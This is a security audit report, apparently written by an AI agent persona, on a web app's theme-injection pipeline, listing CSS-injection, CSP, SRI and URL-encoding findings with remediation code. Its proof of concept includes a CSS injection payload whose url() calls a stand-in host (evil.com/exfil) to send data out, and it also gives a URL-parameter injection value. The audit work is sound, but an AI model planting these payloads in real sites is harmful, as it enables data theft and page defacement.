# 🛡️ Security Audit: Theme Injection Pipeline

**Audit ID:** SECAUDIT-5.5.1  
**Auditor:** security-auditor-b04fef  
**Date:** 2025-01-27  
**Scope:** Design system theme injection pipeline — CSS custom property generation and rendering  
**Standards:** OWASP ASVS L2 (5.1.3, 5.2.1, 5.2.5, 5.3.3, 14.4.3), CIS Benchmark, NIST SP 800-53 (SI-10, SC-18)  

---

## Executive Summary

The theme injection pipeline has a **sound architectural foundation** — Pydantic validation on color fields, `yaml.safe_load()` for config parsing, Jinja2 autoescape enabled, and brand resolution constrained to a registry whitelist. However, several defense-in-depth gaps exist in input validation for non-color fields and Content Security Policy configuration that should be addressed before the pipeline is extended (e.g., admin UI for brand management).

### Overall Risk Rating: **PASS WITH CONDITIONS** ✅ (Moderate Risk)

| Severity | Count |
|----------|-------|
| Critical | 0 |
| High | 0 |
| Medium | 3 |
| Low | 3 |
| Info | 3 |

---

## Audit Methodology

**Data flow analyzed:**
```
config/brands.yaml
  → yaml.safe_load() [design_tokens.py:154]
  → Pydantic model_validate() [design_tokens.py:163]
  → generate_brand_css_variables() [css_generator.py]
  → ThemeContext (cached per brand_key) [theme_middleware.py:127-136]
  → Jinja2 template rendering [base.html:37-42]
  → Browser <style> block + style="" attribute
```

**Brand resolution (user-influenced):**
```
?brand= query param OR X-Brand-Key header OR X-Tenant-Code header
  → _resolve_brand_key() [theme_middleware.py:106-120]
  → Validated against BrandRegistry (whitelist check)
  → Only pre-loaded brand keys accepted ✅
```

---

## Findings

### M-1: CSS Injection via Unvalidated `gradient`, `borderRadius`, Font Fields (Medium)

**OWASP ASVS:** 5.2.1 (Input validation), 5.2.5 (Injection prevention)  
**CVSS v4.0:** 5.3 (Medium) — AV:N/AC:H/AT:P/PR:H/UI:N/VC:L/VI:L/VA:N  
**Affected files:**
- `app/core/design_tokens.py:55` — `gradient: str | None = None` (no validator)
- `app/core/design_tokens.py:81` — `borderRadius: str` (no validator)
- `app/core/design_tokens.py:73-74` — `headingFont: str`, `bodyFont: str` (no validator)
- `app/core/css_generator.py:77` — `variables["--brand-gradient"] = colors.gradient`
- `app/core/css_generator.py:90-91` — Font names injected into CSS
- `app/core/css_generator.py:99` — `borderRadius` injected into CSS

**Description:**  
The Pydantic `BrandColors` model validates `primary`, `secondary`, `accent`, `background`, and `text` fields against `_HEX_COLOR_RE` (strict `#RRGGBB` pattern — excellent ✅). However, the following fields have **zero validation** and flow directly into CSS output:

| Field | Model | Injected Into | Current Values (safe) |
|-------|-------|---------------|----------------------|
| `gradient` | `BrandColors` | `--brand-gradient` CSS var | `linear-gradient(135deg, ...)` |
| `borderRadius` | `BrandDesignSystem` | `--brand-radius` CSS var | `4px`, `8px`, `12px`, `0px`, `6px` |
| `headingFont` | `BrandTypography` | `--brand-font-heading` CSS var + Google Fonts URL | `Montserrat`, `Mulish`, etc. |
| `bodyFont` | `BrandTypography` | `--brand-font-body` CSS var + Google Fonts URL | `Open Sans`, `Spectral`, etc. |

**Proof of concept:** A malicious `gradient` value in `brands.yaml`:
```yaml
gradient: "red; } * { background-image: url('https://evil.com/exfil') } :root { --x: y"
```
Would produce in the `<style>` block:
```css
:root {
  --brand-gradient: red; } * { background-image: url('https://evil.com/exfil') } :root { --x: y;
}
```

Jinja2 HTML autoescape does NOT protect against CSS metacharacters (`}`, `;`) inside `<style>` blocks — confirmed via testing. This allows:
- CSS rule injection (arbitrary styling of any element)
- Data exfiltration via CSS attribute selectors + `url()` (e.g., reading CSRF tokens)
- UI redressing/defacement

**Current threat level: LOW** — `config/brands.yaml` is a static file in version control; no runtime editing API exists. Attack requires repo write access.

**Future threat level: MEDIUM-HIGH** — If an admin brand management UI is ever built, this becomes a direct injection vector.

**Remediation:**
```python
# Immediate: Add validators to design_tokens.py
import re

_CSS_GRADIENT_RE = re.compile(
    r"^linear-gradient\(\d+deg,\s*#[0-9a-fA-F]{6}(\s+\d+%)?,\s*#[0-9a-fA-F]{6}(\s+\d+%)?\)$"
)
_CSS_LENGTH_RE = re.compile(r"^\d{1,3}(px|rem|em|%)$")
_FONT_NAME_RE = re.compile(r"^[a-zA-Z][a-zA-Z0-9 ]{0,49}$")

class BrandColors(BaseModel):
    # ... existing fields ...
    
    @field_validator("gradient", mode="before")
    @classmethod
    def validate_gradient(cls, v: str | None) -> str | None:
        if v is None:
            return None
        if not _CSS_GRADIENT_RE.match(v):
            raise ValueError(f"Invalid gradient: {v!r}")
        return v

class BrandTypography(BaseModel):
    headingFont: str = Field(alias="headingFont")
    bodyFont: str = Field(alias="bodyFont")
    
    @field_validator("headingFont", "bodyFont", mode="before")
    @classmethod
    def validate_font_name(cls, v: str) -> str:
        if not _FONT_NAME_RE.match(v):
            raise ValueError(f"Invalid font name: {v!r}")
        return v

class BrandDesignSystem(BaseModel):
    borderRadius: str = Field(alias="borderRadius")
    
    @field_validator("borderRadius", mode="before")
    @classmethod
    def validate_border_radius(cls, v: str) -> str:
        if not _CSS_LENGTH_RE.match(v):
            raise ValueError(f"Invalid border radius: {v!r}")
        return v
```

**Owner:** Python Programmer 🐍  
**Timeline:** Medium-term (Sprint +1) — current risk is mitigated by static config  

---

### M-2: CSP `'unsafe-inline'` in `script-src` Directive (Medium)

**OWASP ASVS:** 14.4.3 (CSP implementation)  
**CIS Benchmark:** Application Security — Content Security Policy  
**CVSS v4.0:** 5.9 (Medium) — enables XSS bypass if other injection vectors are found  
**Affected file:** `app/main.py:168-176`

**Description:**  
The Content Security Policy includes `'unsafe-inline'` in **both** `script-src` and `style-src`:
```
script-src 'self' 'unsafe-inline' https://cdn.tailwindcss.com https://cdn.jsdelivr.net;
style-src 'self' 'unsafe-inline' https://cdn.tailwindcss.com https://fonts.googleapis.com;
```

- `'unsafe-inline'` in `style-src` is **necessary** for the `<style>` block that injects CSS variables (Finding M-1's template pattern). This is acceptable with risk acknowledgment.
- `'unsafe-inline'` in `script-src` **negates most XSS protection** provided by CSP. Any HTML injection that gets past autoescape (e.g., via `|safe` filter, JavaScript context, or template injection) can execute arbitrary scripts.

**Business impact:** If any XSS vulnerability is found elsewhere in the application, CSP will not act as a defense-in-depth layer.

**Remediation:**
```python
# Phase 1 (Immediate): Add nonce-based CSP for scripts
import secrets

@app.middleware("http")
async def security_headers_middleware(request: Request, call_next):
    nonce = secrets.token_urlsafe(16)
    request.state.csp_nonce = nonce  # Pass to templates
    response = await call_next(request)
    response.headers["Content-Security-Policy"] = (
        "default-src 'self'; "
        f"script-src 'self' 'nonce-{nonce}' https://cdn.jsdelivr.net; "
        "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; "
        "font-src 'self' https://fonts.gstatic.com; "
        "img-src 'self' data:; "
        "connect-src 'self'; "
        "frame-ancestors 'none'"
    )
    return response

# Phase 2: Update base.html scripts to use nonce
# <script nonce="{{ csp_nonce }}" src="..."></script>

# Phase 3: Remove cdn.tailwindcss.com (it's a dev tool, not for production)
```

**Owner:** Python Programmer 🐍 + Experience Architect 🎨  
**Timeline:** Phase 1-2 in Sprint +1; Phase 3 before production deployment  

---

### M-3: No Subresource Integrity (SRI) on CDN Scripts (Medium)

**OWASP ASVS:** 14.2.3 (Third-party component integrity)  
**NIST:** SI-7 (Software, firmware, and information integrity)  
**CVSS v4.0:** 5.3 (Medium) — supply chain risk  
**Affected file:** `app/templates/base.html:19,22`

**Description:**  
External scripts are loaded without `integrity` attributes:
```html
<script src="https://unpkg.com/htmx.org@1.9.10"></script>          <!-- No SRI -->
<script src="https://cdn.jsdelivr.net/npm/chart.js"></script>       <!-- No SRI, no version pin -->
```

If `unpkg.com` or `cdn.jsdelivr.net` is compromised, or if a DNS hijack/MITM occurs, arbitrary JavaScript could be injected into every page.

Additionally, `chart.js` has **no version pinned**, meaning a new (potentially compromised) version could be served at any time.

**Remediation:**
```html
<!-- Immediate: Add SRI hashes and pin versions -->
<script src="https://unpkg.com/htmx.org@1.9.10"
        integrity="sha384-D1Kt99CQMDuVetoL1lrYwg5t+9QdHe7NLX/SoJYkXDFfX37iInKRy16OWvJWN28"
        crossorigin="anonymous"></script>
<script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.7/dist/chart.umd.min.js"
        integrity="sha384-..."
        crossorigin="anonymous"></script>

<!-- Strategic: Vendor these libraries locally -->
<!-- /static/vendor/htmx-1.9.10.min.js -->
<!-- /static/vendor/chart-4.4.7.umd.min.js -->
```

**Owner:** Experience Architect 🎨  
**Timeline:** Immediate (quick win — generate hashes with `openssl dgst -sha384 -binary < file | openssl base64 -A`)  

---

### L-1: Google Fonts URL Font Name Not URL-Encoded (Low)

**OWASP ASVS:** 5.2.1 (Input validation)  
**Affected file:** `app/core/design_tokens.py:193-197`

**Description:**  
Font names are inserted into URLs with only space→`+` replacement:
```python
f"family={font.replace(' ', '+')}:wght@400;500;600;700"
```

A malicious font name like `Montserrat&callback=alert` would produce:
```
https://fonts.googleapis.com/css2?family=Montserrat&callback=alert:wght@400;500;600;700
```

This could inject URL parameters into the Google Fonts request. Current risk is very low (font names come from static YAML), but proper URL encoding is a defense-in-depth best practice.

**Remediation:**
```python
from urllib.parse import quote
params = "&".join(
    f"family={quote(font)}:wght@400;500;600;700"
    for font in sorted(fonts)
)
```

Combined with the `_FONT_NAME_RE` validator from M-1, this is fully mitigated.

**Owner:** Python Programmer 🐍  
**Timeline:** Medium-term (bundle with M-1 fix)

---

### L-2: Inconsistent HTMX Versions Across Templates (Low)

**Affected files:**
- `app/templates/base.html:19` — htmx 1.9.10
- `app/templates/login.html:8` — htmx 1.9.12

**Description:**  
Two different HTMX versions are loaded across templates. This creates maintenance burden and potential inconsistent behavior. The login page also loads `cdn.tailwindcss.com` (the CDN play version), which is explicitly not recommended for production.

**Remediation:** Standardize on a single HTMX version and use local vendor copy.

**Owner:** Experience Architect 🎨  
**Timeline:** Quick win (Sprint +0)

---

### L-3: `brand_key` Not Sanitized for CSS Selector Context (Low)

**Affected file:** `app/core/css_generator.py:124`

**Description:**
```python
lines = [f'[data-brand="{brand_key}"] {{']
```

The `brand_key` is used directly in a CSS selector without sanitization. While brand keys currently come from the YAML registry and are alphanumeric, a key containing `"]` could break the CSS selector context.

**Remediation:**
```python
import re
_BRAND_KEY_RE = re.compile(r"^[a-z][a-z0-9_-]{0,49}$")

def generate_scoped_brand_css(brand_key: str, brand: BrandConfig) -> str:
    if not _BRAND_KEY_RE.match(brand_key):
        raise ValueError(f"Invalid brand key for CSS: {brand_key!r}")
    # ... rest of function
```

**Owner:** Python Programmer 🐍  
**Timeline:** Medium-term (bundle with M-1)

---

### I-1: Cache Does Not Leak Tenant Data — Verified ✅ (Info — Positive Finding)

**Affected file:** `app/core/theme_middleware.py:123-136`

**Description:**  
The `ThemeMiddleware._cache` is keyed by `brand_key`, not by tenant. This is **correct by design**: brands are shared configuration, not tenant-specific secrets. The cache stores only the immutable `ThemeContext` dataclass (frozen=True ✅). Multiple tenants mapped to the same brand correctly share the same cached theme context.

Brand resolution validates against the registry whitelist:
```python
if brand_key and self._get_registry().get(brand_key):
    return brand_key
```
An unknown brand_key falls back to `DEFAULT_BRAND_KEY` — no information disclosure ✅.

🦴 **Good boy treat:** This is well-designed tenant isolation.

---

### I-2: YAML Loading Uses `safe_load()` — Verified ✅ (Info — Positive Finding)

**Affected file:** `app/core/design_tokens.py:154`

```python
raw = yaml.safe_load(f)
```

Using `yaml.safe_load()` prevents YAML deserialization attacks (arbitrary Python object instantiation). This is correct and follows best practices. ✅

---

### I-3: Jinja2 Autoescape Enabled — Verified ✅ (Info — Positive Finding)

**Affected file:** `app/main.py:39`

FastAPI's `Jinja2Templates` enables HTML autoescape by default (confirmed: `autoescape=True`). This prevents HTML attribute breakout in the `style="{{ brand.inline_style }}"` attribute on `<html>` — HTML entities like `"` are escaped to `&#34;`. ✅

However, autoescape does NOT protect within `<style>` blocks (CSS metacharacters are not HTML special chars) — this is why M-1 matters.

---

## Security Checklist Results

| Control | Status | Notes |
|---------|--------|-------|
| XSS via CSS injection | ⚠️ PARTIAL | Color fields validated; gradient/font/radius fields unvalidated (M-1) |
| CSP compatibility | ⚠️ PARTIAL | `unsafe-inline` required for style injection; but also in script-src (M-2) |
| Tenant data leakage | ✅ PASS | Cache isolation correct; registry whitelist enforced (I-1) |
| Input validation (colors) | ✅ PASS | Strict `#RRGGBB` regex via Pydantic validators |
| Input validation (other) | ❌ GAP | gradient, borderRadius, fonts have no validation (M-1) |
| Font loading security | ⚠️ PARTIAL | URLs constructed safely but no URL encoding (L-1) |
| YAML deserialization | ✅ PASS | `yaml.safe_load()` used (I-2) |
| HTML autoescape | ✅ PASS | Enabled by default (I-3) |
| SRI on CDN resources | ❌ GAP | No integrity attributes on any CDN script (M-3) |
| Brand key whitelist | ✅ PASS | User input validated against registry |

---

## Remediation Roadmap

### Immediate (Sprint +0 — Quick Wins)
1. **Add SRI hashes** to CDN scripts in `base.html` and `login.html` (M-3) — Owner: Experience Architect
2. **Pin Chart.js version** in CDN URL (M-3) — Owner: Experience Architect
3. **Standardize HTMX version** across templates (L-2) — Owner: Experience Architect

### Medium-Term (Sprint +1)
4. **Add Pydantic validators** for `gradient`, `borderRadius`, `headingFont`, `bodyFont` (M-1) — Owner: Python Programmer
5. **Add `_BRAND_KEY_RE` validation** for CSS selector context (L-3) — Owner: Python Programmer
6. **URL-encode font names** in Google Fonts URL builder (L-1) — Owner: Python Programmer
7. **Implement CSP nonce** for script-src, remove `'unsafe-inline'` from script-src (M-2) — Owner: Python Programmer + Experience Architect

### Strategic (Sprint +2 and ongoing)
8. **Vendor CDN libraries locally** (eliminate CDN dependency entirely)
9. **Remove `cdn.tailwindcss.com`** from login.html (not for production use)
10. **Add security unit tests** for CSS injection attempts (negative test cases with malicious gradient/font values)
11. **If admin brand UI is built:** implement CSS sanitization library (e.g., `bleach-css` or allowlist-based CSS property validator)

---

## Verification Requirements

After remediation:
- [ ] Run `uv run pytest tests/unit/test_design_tokens.py` — validators reject malicious inputs
- [ ] Add negative test: `BrandColors(gradient="red; } * { display:none", ...)` raises `ValidationError`
- [ ] Add negative test: `BrandTypography(headingFont="Montserrat&callback=x", ...)` raises `ValidationError`
- [ ] Verify CSP nonce renders correctly in all templates
- [ ] Run `curl -I https://staging/` and verify `Content-Security-Policy` header has no `'unsafe-inline'` in `script-src`
- [ ] Verify SRI hashes match CDN file contents

---

## Sign-Off

| Role | Decision | Date |
|------|----------|------|
| Security Auditor 🛡️ (security-auditor-b04fef) | **PASS WITH CONDITIONS** | 2025-01-27 |
| Code Reviewer 🛡️ | Pending | — |
| Pack Leader 🐺 | Pending | — |

**Conditions for unconditional PASS:**
1. M-1 validators implemented and tested
2. M-3 SRI attributes added
3. M-2 CSP nonce at minimum in plan/tracked as issue

*The pipeline is safe to ship in its current form given the static YAML config constraint, but the defense-in-depth gaps must be closed before any dynamic brand management feature is built.*

---

*Woof. Stay safe out there. 🐾🛡️*
